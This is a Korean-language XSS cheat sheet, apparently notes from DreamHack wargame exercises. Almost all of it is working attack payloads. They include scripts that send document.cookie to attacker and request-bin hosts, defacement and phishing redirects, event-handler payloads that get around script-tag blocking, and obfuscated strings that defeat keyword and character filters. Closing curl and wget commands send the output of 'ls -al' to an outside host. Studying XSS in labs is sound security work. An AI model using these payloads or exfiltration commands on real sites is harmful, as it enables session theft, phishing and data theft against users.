
# XSS (Cross Site Scripting)

쿠키 및 세션 탈취 공격 코드
```js
<script>
// "hello" 문자열 alert 실행.
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie;
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```

페이지 변조 공격 코드
```js
<script>
// 이용자의 페이지 정보에 접근.
document;
// 이용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>
```

위치 이동 공격 코드
```js
<script>
// 이용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing";
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>
```

### Cookie 탈취

임의의 이용자가 내 페이지에 접속하면서, cookie를 남기게 한다.
https://tools.dreamhack.games/
```js
<script>location.href = "http://unlekhg.request.dreamhack.games/?memo=" + document.cookie;</script>
```

#### 필터링 우회

- 웹페이지가 입력을 막아놨을 경우, Chrome 개발자 도구로 입력폼을 수정한다.

- script tag가 동작하지 않을 경우
(예) innerHTML
```
<img src=x onerror="javascript:location.href='https://wnudhpp.request.dreamhack.games/flag?flag='+document.cookie"/>
<img src=/ onerror=fetch('/memo?memo='+document.cookie)>
<svg/onload="location.href='/memo?memo='+document.cookie;">
<a tabindex=1 onfocusin=location.href="/memo?memo="+document.cookie autofocus>flag</a>
<video><source onerror='location.href="/memo?memo="+document.cookie';>
```

- 기타
```js
function XSSFilter(data){
  if(/alert|window|document/.test(data)){
    return false;
  }
  return true;
}
/* "alert", "window" 또는 "document" 문자열이 포함되어 있는지 확인하는 필터링입니다.
 * 하지만 this[propertyKey] 문법을 이용해 쉽게 우회가 가능합니다.
 */
this['al'+'ert'](this['docu'+'ment']['coo'+'kie']);
```

```js
function XSSFilter(data){
  if(/alert|window|document|eval|cookie|this|self|parent|top|opener|function|[\-+\\<>{}=]/i.test(data)){
    return false;
  }
  return true;
}
/* 주요 키워드 이외에도 특수문자 등을 탐지합니다.
 * decodeURI, atob와 constructor 속성을 함께 사용하면 원하는 임의의 코드를 실행할 수 있습니다.
 */
// https://onlineunicodetools.com/url-encode-unicode

// %63%6F%6E%73%74%72%75%63%74%6F%72 -> constructor
// %61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29 -> alert(document.cookie)
Boolean[decodeURI('%63%6F%6E%73%74%72%75%63%74%6F%72')](
      decodeURI('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))();
Boolean[atob('Y29uc3RydWN0b3I')](atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ'))();
```

```js
function XSSFilter(data){
  if(/[()"'`]/img.test(data)){
    return false;
  }
  return true;
}
/*
(, ), ", ', ` 문자들에 대해 탐지하는 필터링입니다.
앞서 배운 방법들을 조합하여 필터링을 우회할 수 있습니다.
*/
/alert/.source+[URL+[]][0][12]+/document.cookie/.source+[URL+[]][0][13] instanceof{[Symbol.hasInstance]:eval};
location=/javascript:/.source + /alert/.source + [URL+0][0][12] + /document.cookie/.source + [URL+0][0][13];
```

# Curl / wget

Post JSON
```
curl https://qpcjopq.request.dreamhack.games -d "$(ls -al)"

wget 	https://qpcjopq.request.dreamhack.games --method=POST --body-data="`ls -al`"
```
https://gchq.github.io/CyberChef/ 에서 URL Encode하여 사용한다.